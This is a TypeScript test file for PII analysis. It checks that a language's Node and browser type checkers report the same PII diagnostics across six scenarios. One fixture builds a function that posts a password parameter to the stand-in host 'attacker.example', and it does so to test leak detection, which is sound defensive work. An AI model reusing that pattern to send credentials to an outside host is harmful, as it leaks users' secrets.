/**
 * PII 跨运行时 conformance 测试 (P0-1 / ADR-0009 / P0-R 扩展)
 *
 * 验证 typecheckModule（LSP / Node 路径）和 typecheckBrowser（browser /
 * CF Workers 路径）对同一 Core IR 模块产生**等价的 PII 诊断**。
 *
 * "等价"包含：
 *   - 相同的 PII 诊断 code 集合（所有 PII-related codes，不只 E070/E072/E073）
 *   - 相同的 severity（error vs warning）
 *   - 相同的诊断**计数**（不只是去重后的 set）
 *
 * 这是 ADR-0009 的核心承诺：PII 是一等公民，跨运行时一致。
 * 任何 runtime 间的 drift 都是 P0 阻塞。
 *
 * **注意**：诊断**消息字符串**可能不同（locale 不同），但**code + severity +
 * count** 必须一致。"等价"指 normalized PII diagnostic equivalence——
 * 不是 message string byte 相等。
 *
 * P0-R 修复（codex review High #2 + #3）：
 *   - PII_CODES 集合扩展到所有 PII-related codes（W071/W074/E400 等）
 *   - 断言完整 diagnostic shape（code + severity）而不只是 code 数组
 *   - 新增场景：HTTPS L3 / HTTP L2 / 降级赋值 / 参数违规 / 无 PII / 空模块
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { typecheckModule } from '../../../src/typecheck.js';
import { typecheckBrowser } from '../../../src/typecheck/browser.js';
import { ErrorCode } from '../../../src/diagnostics/error_codes.js';
import { Effect } from '../../../src/config/semantic.js';
import { Core as CoreBuilder } from '../../../src/core/core_ir.js';
import type { Core, TypecheckDiagnostic } from '../../../src/types.js';

const IO_EFFECT: readonly Effect[] = [Effect.IO];

/**
 * 完整 PII codes 集合：包含所有 checkModulePII 可能发出的 codes。
 * codex review High #2 抓到的回归：原集合只有 3 个 (E070/E072/E073)，
 * 漏掉了 W071 / W074 / E400 等。漏掉这些意味着 Node/browser 在这些
 * codes 上 drift 时测试看不到。
 */
const PII_CODES = new Set<string>([
  ErrorCode.PII_ASSIGN_DOWNGRADE,      // E070
  ErrorCode.PII_SINK_UNSANITIZED,       // E072
  ErrorCode.PII_ARG_VIOLATION,          // E073
  ErrorCode.PII_IMPLICIT_UPLEVEL,       // W071
  ErrorCode.PII_SINK_UNKNOWN,           // W074
  ErrorCode.PII_HTTP_UNENCRYPTED,       // E400
  ErrorCode.PII_ANNOTATION_MISSING,     // E401
  ErrorCode.PII_SENSITIVITY_MISMATCH,   // E402
  ErrorCode.PII_MISSING_CONSENT_CHECK,  // E403
  ErrorCode.PII_ANALYZER_FAILED,        // E404
]);

interface PiiDiagShape {
  code: string;
  severity: 'error' | 'warning';
}

function piiDiags(diags: readonly TypecheckDiagnostic[]): PiiDiagShape[] {
  return diags
    .filter((d) => typeof d.code === 'string' && PII_CODES.has(d.code))
    .map((d) => ({
      code: String(d.code),
      severity: (d.severity ?? 'error') as 'error' | 'warning',
    }))
    .sort((a, b) =>
      a.code === b.code
        ? a.severity.localeCompare(b.severity)
        : a.code.localeCompare(b.code),
    );
}

const TEXT = (): Core.Type => CoreBuilder.TypeName('Text');
const piiType = (level: 'L1' | 'L2' | 'L3', category: Core.PiiType['category']): Core.Type =>
  CoreBuilder.Pii(TEXT(), level, category);
const piiParam = (name: string, level: 'L1' | 'L2' | 'L3'): Core.Parameter => ({
  name,
  type: piiType(level, 'email'),
});

function makeFunc(opts: {
  name: string;
  params: readonly Core.Parameter[];
  ret: Core.Type;
  body: readonly Core.Statement[];
  effects?: readonly Effect[];
}): Core.Func {
  return CoreBuilder.Func(
    opts.name,
    [],
    opts.params,
    opts.ret,
    opts.effects ?? IO_EFFECT,
    CoreBuilder.Block(opts.body),
    [],
    false,
  );
}

function assertConformance(
  module: Core.Module,
  expectAtLeastOnePii: boolean,
  context: string,
) {
  const nodeDiags = piiDiags(typecheckModule(module));
  const browserDiags = piiDiags(typecheckBrowser(module));

  if (expectAtLeastOnePii) {
    assert.ok(
      nodeDiags.length > 0,
      `[${context}] Node 路径应产生至少一个 PII 诊断，实际：${JSON.stringify(nodeDiags)}`,
    );
    assert.ok(
      browserDiags.length > 0,
      `[${context}] Browser 路径应产生至少一个 PII 诊断（ADR-0009 P0-1），实际：${JSON.stringify(browserDiags)}`,
    );
  }

  assert.deepEqual(
    nodeDiags,
    browserDiags,
    `[${context}] 跨运行时 PII 诊断 shape 必须一致\n` +
      `  node:    ${JSON.stringify(nodeDiags)}\n` +
      `  browser: ${JSON.stringify(browserDiags)}`,
  );
}

describe('PII 跨运行时 conformance (ADR-0009 P0-1 / P0-R 扩展)', () => {
  it('场景 1：HTTPS sink 泄露 L3 PII', () => {
    const httpImport = CoreBuilder.Import('Http', 'H');
    const fn = makeFunc({
      name: 'leak_password_via_https',
      params: [piiParam('password', 'L3')],
      ret: TEXT(),
      effects: IO_EFFECT,
      body: [
        CoreBuilder.Return(
          CoreBuilder.Call(CoreBuilder.Name('H.post'), [
            CoreBuilder.String('https://attacker.example'),
            CoreBuilder.Name('password'),
          ]),
        ),
      ],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.http_leak',
      [httpImport, fn],
    );
    assertConformance(module, true, 'L3 HTTPS sink');
  });

  it('场景 2：L2 PII over HTTP（明文）', () => {
    const httpImport = CoreBuilder.Import('Http', 'Http');
    const fn = makeFunc({
      name: 'l2_over_http',
      params: [piiParam('email', 'L2')],
      ret: TEXT(),
      effects: IO_EFFECT,
      body: [
        CoreBuilder.Return(
          CoreBuilder.Call(CoreBuilder.Name('Http.post'), [
            CoreBuilder.String('http://api.example'),
            CoreBuilder.Name('email'),
          ]),
        ),
      ],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.l2_http',
      [httpImport, fn],
    );
    assertConformance(module, true, 'L2 HTTP plaintext');
  });

  it('场景 3：降级赋值 L3 PII → L1 变量', () => {
    const fn = makeFunc({
      name: 'downgrade_l3_to_l1',
      params: [piiParam('ssn', 'L3'), piiParam('public_id', 'L1')],
      ret: TEXT(),
      effects: [Effect.PURE],
      body: [
        CoreBuilder.Let('alias', CoreBuilder.Name('public_id')),
        CoreBuilder.Set('alias', CoreBuilder.Name('ssn')),
        CoreBuilder.Return(CoreBuilder.Name('alias')),
      ],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.downgrade',
      [fn],
    );
    assertConformance(module, true, 'L3→L1 downgrade');
  });

  it('场景 4：参数违规（L2 PII → plain Text param）', () => {
    const callee = makeFunc({
      name: 'plain_handler',
      params: [{ name: 'data', type: TEXT() }],
      ret: TEXT(),
      effects: [Effect.PURE],
      body: [CoreBuilder.Return(CoreBuilder.Name('data'))],
    });
    const caller = makeFunc({
      name: 'pii_to_plain',
      params: [piiParam('email', 'L2')],
      ret: TEXT(),
      effects: [Effect.PURE],
      body: [
        CoreBuilder.Return(
          CoreBuilder.Call(CoreBuilder.Name('plain_handler'), [CoreBuilder.Name('email')]),
        ),
      ],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.arg_violation',
      [callee, caller],
    );
    assertConformance(module, true, 'arg violation');
  });

  it('场景 5：无 PII 代码不应误报', () => {
    const fn = makeFunc({
      name: 'no_pii',
      params: [{ name: 'plain_text', type: TEXT() }],
      ret: TEXT(),
      effects: [Effect.PURE],
      body: [CoreBuilder.Return(CoreBuilder.Name('plain_text'))],
    });
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.no_pii',
      [fn],
    );

    const nodeDiags = piiDiags(typecheckModule(module));
    const browserDiags = piiDiags(typecheckBrowser(module));

    assert.equal(nodeDiags.length, 0, 'Node 路径不应在纯文本上误报 PII');
    assert.equal(browserDiags.length, 0, 'Browser 路径不应在纯文本上误报 PII');
    assert.deepEqual(nodeDiags, browserDiags);
  });

  it('场景 6：空模块不崩溃，0 PII 诊断', () => {
    const module: Core.Module = CoreBuilder.Module(
      'tests.pii.cross_runtime.empty',
      [],
    );
    const nodeDiags = piiDiags(typecheckModule(module));
    const browserDiags = piiDiags(typecheckBrowser(module));
    assert.deepEqual(nodeDiags, []);
    assert.deepEqual(browserDiags, []);
  });

  it('元测试：PII_CODES 集合至少含 7 个 codes（防止再次漏掉）', () => {
    // codex review High #2: 原集合只有 3 个，漏掉了 W071/W074/E400 等。
    // 加固：保证未来添加新 PII code 时同步加入此集合。
    assert.ok(
      PII_CODES.size >= 7,
      `PII_CODES 应包含至少 7 个 PII-related codes，实际 ${PII_CODES.size} 个`,
    );
    assert.ok(PII_CODES.has('E070'), 'PII_ASSIGN_DOWNGRADE (E070) 必须在集合');
    assert.ok(PII_CODES.has('E072'), 'PII_SINK_UNSANITIZED (E072) 必须在集合');
    assert.ok(PII_CODES.has('E073'), 'PII_ARG_VIOLATION (E073) 必须在集合');
    assert.ok(PII_CODES.has('W071'), 'PII_IMPLICIT_UPLEVEL (W071) 必须在集合');
    assert.ok(PII_CODES.has('W074'), 'PII_SINK_UNKNOWN (W074) 必须在集合');
    assert.ok(PII_CODES.has('E400'), 'PII_HTTP_UNENCRYPTED (E400) 必须在集合');
    assert.ok(PII_CODES.has('E404'), 'PII_ANALYZER_FAILED (E404) 必须在集合');
  });
});
